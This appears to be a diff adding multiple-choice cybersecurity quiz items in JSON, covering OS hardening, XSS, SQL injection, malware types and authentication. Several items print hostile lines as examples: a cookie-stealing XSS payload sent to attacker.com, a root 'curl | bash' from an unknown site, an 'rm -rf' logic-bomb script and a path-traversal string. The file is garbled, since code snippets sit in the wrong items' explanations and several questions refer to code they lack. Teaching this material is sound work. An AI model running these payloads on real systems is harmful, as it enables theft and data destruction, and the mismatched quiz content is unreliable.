+        "correct_answer": "B",
+        "explanation": "Stateful firewalls are \"aware\" of connections. If you send a request out, the firewall remembers\nit and automatically lets the specific response back in, without needing a manual rule for every\npossible return packet.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 43,
+        "question": "(Conceptual) What is the primary purpose of Address Space Layout Randomization (ASLR) in modern operating systems?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To make the file system faster."
+            },
+            {
+                "label": "B",
+                "text": "To make it difficult for an attacker to predict the memory address of specific system functions, hindering buffer overflow attacks."
+            },
+            {
+                "label": "C",
+                "text": "To encrypt the user's hard drive."
+            },
+            {
+                "label": "D",
+                "text": "To prevent the CPU from overheating."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "ASLR randomly changes the memory locations of system libraries and executable code every\ntime the system boots. Even if an attacker can overflow a buffer, they won't know where the\n\"malicious jump\" should point to.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 44,
+        "question": "(Scenario-Based) A security engineer wants to ensure that even if a user is the \"Owner\" of a file, they cannot grant access to another unauthorized user. Which access control model should be implemented?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Discretionary Access Control (DAC)"
+            },
+            {
+                "label": "B",
+                "text": "Mandatory Access Control (MAC)"
+            },
+            {
+                "label": "C",
+                "text": "Role-Based Access Control (RBAC)"
+            },
+            {
+                "label": "D",
+                "text": "Identity-Based Access Control (IBAC)"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "In DAC (common in standard Linux), the owner has total control. In MAC (like SELinux), the\nsecurity policy is centrally managed by the system based on security labels, and even the\nowner cannot override it.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 45,
+        "question": "(Code-Tracing) A system administrator runs the following command on a Linux server. What is the security implication?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It increases the encryption strength of the server."
+            },
+            {
+                "label": "B",
+                "text": "It reduces the attack surface by disabling an insecure, plaintext remote access service."
+            },
+            {
+                "label": "C",
+                "text": "It prevents the administrator from logging in via SSH."
+            },
+            {
+                "label": "D",
+                "text": "It deletes the user's password."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Telnet is highly insecure as it transmits data (including passwords) in cleartext. Disabling\nunused or insecure services is a fundamental step in OS Hardening.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 46,
+        "question": "(Conceptual) What does Data Execution Prevention (DEP) do?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It prevents users from deleting files."
+            },
+            {
+                "label": "B",
+                "text": "It marks certain memory regions (like the stack) as non-executable, preventing attackers from running malicious code injected into data buffers."
+            },
+            {
+                "label": "C",
+                "text": "It speeds up the execution of authorized programs."
+            },
+            {
+                "label": "D",
+                "text": "It automatically backups the OS."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "DEP (or NX bit) ensures that the CPU will only execute code from memory regions specifically\nmarked as executable. This stops many \"stack-smashing\" attacks where code is injected into\na data buffer and then executed.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 47,
+        "question": "(Scenario-Based) An attacker gains access to a low-privilege service account and uses a kernel vulnerability to gain \"Root\" access. What is this type of attack called?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Cross-Site Scripting"
+            },
+            {
+                "label": "B",
+                "text": "Horizontal Movement"
+            },
+            {
+                "label": "C",
+                "text": "Vertical Privilege Escalation"
+            },
+            {
+                "label": "D",
+                "text": "Brute Force"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "bash - hardening\n$ systemctl disable telnet.socket\n$ systemctl stop telnet.socket\nVertical Privilege Escalation occurs when a user gains a higher level of permission than they\nwere originally granted (e.g., User to Admin). Horizontal would be User A gaining User B's\npermissions.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 48,
+        "question": "(Conceptual) What is the role of the Trusted Platform Module (TPM) chip in OS security?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To increase the CPU clock speed."
+            },
+            {
+                "label": "B",
+                "text": "To provide a hardware-based root of trust for storing cryptographic keys and ensuring system integrity (Secure Boot)."
+            },
+            {
+                "label": "C",
+                "text": "To act as a secondary hard drive."
+            },
+            {
+                "label": "D",
+                "text": "To manage the internet connection."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The TPM is a dedicated microcontroller that secures hardware by integrating cryptographic\nkeys into devices. It is used for disk encryption (like BitLocker) and verifying that the OS\nbootloader hasn't been tampered with.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 49,
+        "question": "(Comparison) Compare a Standard User account with a Service Account.",
+        "options": [
+            {
+                "label": "A",
+                "text": "Standard users are for software; Service accounts are for people."
+            },
+            {
+                "label": "B",
+                "text": "Service accounts are used by automated processes and usually have no interactive login capability to reduce risk."
+            },
+            {
+                "label": "C",
+                "text": "Service accounts always have root privileges."
+            },
+            {
+                "label": "D",
+                "text": "There is no difference."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "By creating specialized service accounts for applications (like a database service), the OS can\nlimit the account's permissions to only what that specific app needs, following the Principle of\nLeast Privilege.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 50,
+        "question": "(Scenario-Based) You find a file on a Linux server with permissions -rwsr-xr-x. What does the s in the owner's execution spot signify?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The file is a system file."
+            },
+            {
+                "label": "B",
+                "text": "The Setuid bit is set; the file will execute with the permissions of the file owner rather than the user."
+            },
+            {
+                "label": "C",
+                "text": "The file is encrypted."
+            },
+            {
+                "label": "D",
+                "text": "The file is shared via network."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The setuid (Set User ID) bit is a powerful but risky feature. If the owner is root, any user\nwho runs this file will temporarily gain root privileges during the execution of that program.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 51,
+        "question": "(Conceptual) What is Operating System Hardening?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Replacing the hard drive with a solid-state drive."
+            },
+            {
+                "label": "B",
+                "text": "The act of securing an OS by minimizing its attack surface (disabling services, patching, configuring firewalls)."
+            },
+            {
+                "label": "C",
+                "text": "Making the OS run faster by overclocking."
+            },
+            {
+                "label": "D",
+                "text": "Installing an antivirus."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Hardening is a proactive multi-step process to secure an OS beyond its default \"out of the\nbox\" configuration.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 52,
+        "question": "(Code-Tracing) What is the security risk of the following terminal output for an administrator account?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The website might be slow."
+            },
+            {
+                "label": "B",
+                "text": "Bash is an outdated shell."
+            },
+            {
+                "label": "C",
+                "text": "The script is being executed with full administrative privileges without being inspected, allowing for a total system compromise."
+            },
+            {
+                "label": "D",
+                "text": "The URL is not using port 80."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Piping a remote script directly into bash while running as root is one of the most dangerous\npractices in OS administration. It gives the remote script total control to install malware or\nbackdoors.\nroot-shell\n# Current user is root\n# curl -s https://unknown-site.com/install.sh | bash",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 53,
+        "question": "(Scenario-Based) An attacker enters the following string into a search box: <script>document.location='http://attacker.com/steal? c='+document.cookie</script>. If the site displays this back to the user without filtering, what attack has occurred?",
+        "options": [
+            {
+                "label": "A",
+                "text": "SQL Injection"
+            },
+            {
+                "label": "B",
+                "text": "Cross-Site Scripting (XSS)"
+            },
+            {
+                "label": "C",
+                "text": "Cross-Site Request Forgery (CSRF)"
+            },
+            {
+                "label": "D",
+                "text": "Directory Traversal"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "This is a classic XSS attack where a script is executed in the victim's browser to steal session\ncookies and send them to a malicious server.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 54,
+        "question": "(Code-Tracing) Analyze this Node.js code snippet. Why is it vulnerable to SQL Injection?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It uses a SELECT statement."
+            },
+            {
+                "label": "B",
+                "text": "It uses string concatenation to build a query, allowing an attacker to manipulate the SQL logic via the 'id' parameter."
+            },
+            {
+                "label": "C",
+                "text": "It is missing a semicolon at the end of the query."
+            },
+            {
+                "label": "D",
+                "text": "It doesn't use the 'admin' keyword."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "String concatenation allows a user to input something like 1 OR 1=1, which would change\nthe query to return all users. The correct fix is using parameterized queries (e.g., WHERE id\n= ?).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 55,
+        "question": "(Conceptual) What is the primary defense against Cross-Site Request Forgery (CSRF) attacks?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Using a Firewall."
+            },
+            {
+                "label": "B",
+                "text": "Encoding all HTML output."
+            },
+            {
+                "label": "C",
+                "text": "Using unique anti-CSRF tokens for every state-changing request."
+            },
+            {
+                "label": "D",
+                "text": "Encrypting the database."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "backend.js\nconst query = \"SELECT * FROM users WHERE id = \" + req.query.id;\ndb.execute(query);\nCSRF tokens are unique, secret, and unpredictable values generated by the server. If a\nmalicious site tries to forge a request, it won't know the correct token, and the server will reject\nthe action.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 56,
+        "question": "(Scenario-Based) A user changes the URL from mysite.com/invoice/500 to mysite.com/invoice/501 and is able to see someone else's private invoice. This vulnerability is known as:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Broken Authentication"
+            },
+            {
+                "label": "B",
+                "text": "SQL Injection"
+            },
+            {
+                "label": "C",
+                "text": "Insecure Direct Object Reference (IDOR)"
+            },
+            {
+                "label": "D",
+                "text": "Cross-Site Scripting"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "IDOR happens when an application exposes a reference to an internal implementation object\n(like a row ID in a database) without an authorization check to ensure the user owns that\nobject.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 57,
+        "question": "(Conceptual) Which HTTP header is used to prevent the browser from rendering a page inside an <iframe>, effectively stopping Clickjacking attacks?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Strict-Transport-Security"
+            },
+            {
+                "label": "B",
+                "text": "X-Frame-Options"
+            },
+            {
+                "label": "C",
+                "text": "Content-Type"
+            },
+            {
+                "label": "D",
+                "text": "Access-Control-Allow-Origin"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The X-Frame-Options header (or the frame-ancestors directive in CSP) tells the\nbrowser whether it's okay to frame the page. Setting it to DENY or SAMEORIGIN stops\nclickjacking.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 58,
+        "question": "(Code-Tracing) To prevent XSS, a developer converts the character < into &lt; before displaying user-provided text on a page. This process is called:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Hashing"
+            },
+            {
+                "label": "B",
+                "text": "Salting"
+            },
+            {
+                "label": "C",
+                "text": "Output Encoding"
+            },
+            {
+                "label": "D",
+                "text": "Obfuscation"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Output encoding ensures that the browser treats user-supplied data as content (text) rather\nthan executable code (HTML tags).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 59,
+        "question": "(Conceptual) What is the purpose of the Same-Origin Policy (SOP) in web browsers?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To make sure all users use the same browser version."
+            },
+            {
+                "label": "B",
+                "text": "To prevent a script loaded from one origin from getting or setting properties of a document from a different origin."
+            },
+            {
+                "label": "C",
+                "text": "To force all websites to use HTTPS."
+            },
+            {
+                "label": "D",
+                "text": "To restrict the number of tabs a user can open."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "SOP is a fundamental security mechanism. It prevents a malicious script on evil.com from\nreading your private data or session cookies from yourbank.com.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 60,
+        "question": "(Comparison) What is the difference between Authentication and Session Management?",
+        "options": [
+            {
+                "label": "A",
+                "text": "They are the same thing."
+            },
+            {
+                "label": "B",
+                "text": "Authentication verifies the user's identity (e.g., login); Session Management tracks the user's state across multiple requests after login."
+            },
+            {
+                "label": "C",
+                "text": "Session management is only for mobile apps."
+            },
+            {
+                "label": "D",
+                "text": "Authentication uses cookies; Session management uses passwords."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Authentication happens once (at login). Session management is the ongoing process of using\na \"Session ID\" or \"Token\" to prove you are still the person who logged in.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 61,
+        "question": "(Conceptual) Why is the HttpOnly flag on a cookie important for security?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It makes the cookie expire faster."
+            },
+            {
+                "label": "B",
+                "text": "It prevents client-side scripts (JavaScript) from accessing the cookie, mitigating the impact of XSS attacks."
+            },
+            {
+                "label": "C",
+                "text": "It encrypts the cookie data."
+            },
+            {
+                "label": "D",
+                "text": "It only allows the cookie to be sent over HTTPS."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If an attacker successfully performs an XSS attack, they usually try to read\ndocument.cookie to steal session IDs. The HttpOnly flag blocks JS access to that cookie,\nprotecting the session.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 62,
+        "question": "(Scenario-Based) An attacker discovers an application's hidden administrative URL / admin_backup_setup_hidden by guessing the name. This is an example of which OWASP category?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Injection"
+            },
+            {
+                "label": "B",
+                "text": "Insecure Design"
+            },
+            {
+                "label": "C",
+                "text": "Security Misconfiguration"
+            },
+            {
+                "label": "D",
+                "text": "Broken Access Control"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Failing to properly restrict access to sensitive pages or relying on \"secret\" URLs is a\nconfiguration and access control failure. All sensitive pages must require explicit authorization.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 63,
+        "question": "(Conceptual) What does HSTS (HTTP Strict Transport Security) achieve?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It speeds up the website."
+            },
+            {
+                "label": "B",
+                "text": "It forces the browser to only communicate with the server over HTTPS, preventing SSL stripping attacks."
+            },
+            {
+                "label": "C",
+                "text": "It prevents SQL injection."
+            },
+            {
+                "label": "D",
+                "text": "It hides the server's IP address."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "HSTS is a policy communicated by the server to the browser. Once received, the browser will\nautomatically convert any http:// links to https:// for that site.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 64,
+        "question": "(Scenario-Based) An application allows a user to \"Upload an Avatar.\" An attacker uploads a file named shell.php containing malicious code. This is a:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Cross-Site Scripting attack."
+            },
+            {
+                "label": "B",
+                "text": "Unrestricted File Upload vulnerability."
+            },
+            {
+                "label": "C",
+                "text": "Denail of Service attack."
+            },
+            {
+                "label": "D",
+                "text": "Man-in-the-Middle attack."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If the server does not validate the file extension or content, an attacker can upload executable\nscripts to the web server and then trigger them to gain full control.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 65,
+        "question": "(Conceptual) What is Directory Traversal (or Path Traversal)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A way to speed up file searches."
+            },
+            {
+                "label": "B",
+                "text": "An attack that aims to access files and directories that are stored outside the web root folder (e.g., using ../)."
+            },
+            {
+                "label": "C",
+                "text": "Deleting all files on a server."
+            },
+            {
+                "label": "D",
+                "text": "A type of network routing."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "By using input like ../../../../etc/passwd, an attacker can trick the application into\nreading sensitive system files that were never intended to be public.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 66,
+        "question": "(Comparison) Compare Black-box vs. White-box security testing for web apps.",
+        "options": [
+            {
+                "label": "A",
+                "text": "Black-box is only for developers."
+            },
+            {
+                "label": "B",
+                "text": "Black-box tests the app from the outside without knowing the code; White-box involves reviewing the actual source code (SAST)."
+            },
+            {
+                "label": "C",
+                "text": "White-box is always faster."
+            },
+            {
+                "label": "D",
+                "text": "Black-box is more thorough."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Black-box (DAST) simulates a real attacker. White-box (SAST) allows security analysts to find\ndeep logic flaws by reading the code directly.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 67,
+        "question": "(Conceptual) What is the \"Least Privilege\" principle applied to a web application's database user?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The DB user should have the same password as the admin."
+            },
+            {
+                "label": "B",
+                "text": "The DB user should only have permissions for specific tables (SELECT, INSERT) and should not be a \"Superuser\" or \"DB Owner.\""
+            },
+            {
+                "label": "C",
+                "text": "The DB user should have zero permissions."
+            },
+            {
+                "label": "D",
+                "text": "The DB user should be allowed to drop tables for maintenance."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If a web app is compromised via SQL Injection, a \"Least Privilege\" database user prevents the\nattacker from dropping the entire database or accessing system configuration tables.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 68,
+        "question": "(Comparison) What is the fundamental difference between a Computer Virus and a Computer Worm?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A virus is faster than a worm."
+            },
+            {
+                "label": "B",
+                "text": "A worm targets the CPU, while a virus targets the RAM."
+            },
+            {
+                "label": "C",
+                "text": "A virus requires a host program and human action to propagate, while a worm is standalone and self-replicates across networks."
+            },
+            {
+                "label": "D",
+                "text": "Viruses are only found on Windows; worms are only for Linux."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "The defining trait of a worm is its ability to spread automatically (e.g., via network\nvulnerabilities) without a user ever opening a file. A virus remains dormant until the user\nexecutes the infected \"host\" file.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 69,
+        "question": "(Scenario-Based) A user downloads what looks like a \"Free Video Player,\" but upon installation, their browser settings are changed, and their files are slowly being sent to a remote server. This is an example of a:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Logic Bomb"
+            },
+            {
+                "label": "B",
+                "text": "Trojan Horse"
+            },
+            {
+                "label": "C",
+                "text": "Virus"
+            },
+            {
+                "label": "D",
+                "text": "Ransomware"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A Trojan presents itself as a useful tool but hides a malicious function inside. Unlike viruses or\nworms, Trojans do not attempt to replicate themselves; they rely on social engineering to be\ninstalled.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 70,
+        "question": "(Conceptual) Which type of malware is specifically designed to grant an attacker high- level administrative access while simultaneously hiding its presence from antivirus software and the OS task manager?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Adware"
+            },
+            {
+                "label": "B",
+                "text": "Spyware"
+            },
+            {
+                "label": "C",
+                "text": "Rootkit"
+            },
+            {
+                "label": "D",
+                "text": "Macro Virus"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Rootkits operate at a deep level (often the kernel). They intercept system calls, so when an\nantivirus asks \"List all running processes,\" the rootkit removes itself from the list before the OS\nresponds.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 71,
+        "question": "(Code/Logic) A security analyst finds a script set to run on a server. What type of attack does this represent?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Ransomware"
+            },
+            {
+                "label": "B",
+                "text": "Trojan"
+            },
+            {
+                "label": "C",
+                "text": "Logic Bomb"
+            },
+            {
+                "label": "D",
+                "text": "Phishing"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "A Logic Bomb is malicious code that lies dormant until a specific \"trigger\" occurs (e.g., a\nspecific date, or a user being deleted from the HR system).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 72,
+        "question": "(Conceptual) What is the primary function of a Command and Control (C&C) server in a Botnet?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To host the antivirus updates."
+            },
+            {
+                "label": "B",
+                "text": "To send instructions to the compromised \"zombie\" computers to coordinate a massive attack (like a DDoS)."
+            },
+            {
+                "label": "C",
+                "text": "To encrypt the attacker's hard drive."
+            },
+            {
+                "label": "D",
+                "text": "To serve as a backup for the target's data."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A Botnet is a decentralized collection of hacked devices. The C&C server is the centralized\n\"brain\" used by the attacker (Botmaster) to tell the devices what to do.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 73,
+        "question": "(Comparison) How does Spear Phishing differ from a standard Phishing attack?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Spear phishing is only done via SMS."
+            },
+            {
+                "label": "B",
+                "text": "Standard phishing targets only high-level executives."
+            },
+            {
+                "label": "C",
+                "text": "Spear phishing is a highly targeted attack directed at a specific individual or organization, often using personal details to build trust."
+            },
+            {
+                "label": "D",
+                "text": "There is no difference."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "cron_job.sh\n# Check if today is the company's 10th anniversary\nif [ $(date +%Y-%m-%d) == \"2026-05-20\" ]; then\nrm -rf /var/www/html/*\nfi\nPhishing is a \"cast a wide net\" approach (sending millions of generic emails). Spear phishing\nis \"hunting with a spear\"—the attacker researches the victim first to make the scam highly\nconvincing.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 74,
+        "question": "(Scenario-Based) A user's screen suddenly locks, and a message appears stating: \"Your files have been encrypted. Pay 0.5 BTC to the following address to regain access.\" This is:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Spyware"
+            },
+            {
+                "label": "B",
+                "text": "Worm"
+            },
+            {
+                "label": "C",
+                "text": "Ransomware"
+            },
+            {
+                "label": "D",
+                "text": "Adware"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Ransomware uses asymmetric encryption to lock files. The attacker keeps the private key,\nmaking it mathematically impossible for the victim to recover the data without paying.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 75,
+        "question": "(Conceptual) An attacker uses a list of the 10,000 most commonly used passwords to try and log into an account. What is this technique called?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Brute-force Attack"
+            },
+            {
+                "label": "B",
+                "text": "Dictionary Attack"
+            },
+            {
+                "label": "C",
+                "text": "Social Engineering"
+            },
+            {
+                "label": "D",
+                "text": "Replay Attack"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A dictionary attack uses pre-defined lists of likely passwords. A pure Brute-force attack would\ntry \"aaaaa\", then \"aaaab\", then \"aaaac\", which takes much longer.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 76,
+        "question": "(Conceptual) What does a Keylogger primarily target?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The computer's hard drive space."
+            },
+            {
+                "label": "B",
+                "text": "Confidentiality (by capturing every keystroke, including passwords and credit card numbers)."
+            },
+            {
+                "label": "C",
+                "text": "The computer's network bandwidth."
+            },
+            {
+                "label": "D",
+                "text": "Availability (by crashing the computer)."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Keyloggers are a form of spyware. By recording what a user types, an attacker can bypass\nencryption and multi-factor authentication by stealing credentials directly at the source.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 77,
+        "question": "(Scenario-Based) A high-profile website is taken offline because it is flooded with millions of requests from 50,000 different IP addresses simultaneously. This is a:",
+        "options": [
+            {
+                "label": "A",
+                "text": "DoS (Denial of Service)"
+            },
+            {
+                "label": "B",
+                "text": "DDoS (Distributed Denial of Service)"
+            },
+            {
+                "label": "C",
+                "text": "SQL Injection"
+            },
+            {
+                "label": "D",
+                "text": "Man-in-the-Middle"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "While both aim to make the site unavailable, a DDoS is \"Distributed\"—it uses a botnet (many\nsources), making it much harder to block than an attack from a single IP (DoS).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 78,
+        "question": "(Conceptual) What is \"Zero-day\" malware?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Malware that deletes all files on Day 0."
+            },
+            {
+                "label": "B",
+                "text": "Malware that exploits a vulnerability that has no known patch or signature available from security vendors."
+            },
+            {
+                "label": "C",
+                "text": "Malware that only lasts for 24 hours."
+            },
+            {
+                "label": "D",
+                "text": "Malware designed by beginners."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A Zero-day attack is extremely dangerous because traditional \"signature-based\" antivirus\nprograms have no way of recognizing the new threat.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 79,
+        "question": "(Scenario-Based) An attacker leaves a USB drive labeled \"Executive Salaries 2024\" in a company parking lot, hoping an employee will plug it into a corporate computer. This is an example of:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Technical exploitation"
+            },
+            {
+                "label": "B",
+                "text": "Network sniffing"
+            },
+            {
+                "label": "C",
+                "text": "Social Engineering (Baiting)"
+            },
+            {
+                "label": "D",
+                "text": "Logic Bombing"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Baiting exploits human curiosity. The \"payload\" is usually a Trojan or worm on the USB drive\nthat executes as soon as the curious employee opens the files.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 80,
+        "question": "(Conceptual) A user logs into a system using their fingerprint and a one-time password (OTP) sent to their mobile device. Which categories of authentication factors are being used?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Something you know and something you have."
+            },
+            {
+                "label": "B",
+                "text": "Something you are and something you know."
+            },
+            {
+                "label": "C",
+                "text": "Something you are and something you have."
+            },
+            {
+                "label": "D",
+                "text": "Two instances of \"something you know.\""
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "A fingerprint is a biometric (something you are). A mobile device receiving an OTP is a\nphysical token (something you have). This is a valid MFA implementation.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 81,
+        "question": "(Scenario-Based) An organization wants to implement a system where access is granted based on the user's department, the time of day, and the security level of the document. Which access control model is most suitable?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Discretionary Access Control (DAC)"
+            },
+            {
+                "label": "B",
+                "text": "Role-Based Access Control (RBAC)"
+            },
+            {
+                "label": "C",
+                "text": "Mandatory Access Control (MAC)"
+            },
+            {
+                "label": "D",
+                "text": "Attribute-Based Access Control (ABAC)"
+            }
+        ],
+        "correct_answer": "D",
+        "explanation": "ABAC is the most flexible model because it evaluates \"Attributes\" (Department, Time, Security\nClearance) to make a dynamic decision, rather than relying on a static role or ownership.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 82,
+        "question": "(Code-Tracing) Analyze the following logic for a login system. What is the primary security flaw in this specific implementation? auth_logic.js function checkLogin(user_input, stored_hash) { if (md5(user_input) === stored_hash) {",
+        "options": [
+            {
+                "label": "A",
+                "text": "It uses triple equals (===)."
+            },
+            {
+                "label": "B",
+                "text": "It uses the MD5 hashing algorithm, which is cryptographically broken and vulnerable to collision attacks."
+            },
+            {
+                "label": "C",
+                "text": "It returns a boolean value."
+            },
+            {
+                "label": "D",
+                "text": "It compares the input to a stored hash."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "MD5 is no longer considered secure for password storage because it is too fast (easy to\nbrute-force) and has known mathematical weaknesses (collisions). Modern systems should\nuse bcrypt, Scrypt, or Argon2.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 83,
